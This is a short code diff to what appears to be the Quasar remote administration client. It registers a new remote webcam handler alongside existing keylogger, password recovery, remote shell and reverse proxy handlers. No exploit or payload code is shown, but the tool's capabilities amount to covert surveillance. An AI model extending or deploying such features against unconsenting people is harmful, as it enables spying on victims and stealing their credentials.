@@ -35,7 +35,7 @@ namespace Quasar.Client
         /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
         /// </summary>
         private readonly List<IMessageProcessor> _messageProcessors;
-        
+
         /// <summary>
         /// The background keylogger service used to capture and store keystrokes.
         /// </summary>
@@ -171,6 +171,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new PasswordRecoveryHandler());
             _messageProcessors.Add(new RegistryHandler());
             _messageProcessors.Add(new RemoteDesktopHandler());
+            _messageProcessors.Add(new RemoteWebcamHandler());
             _messageProcessors.Add(new RemoteShellHandler(client));
             _messageProcessors.Add(new ReverseProxyHandler(client));
             _messageProcessors.Add(new ShutdownHandler());
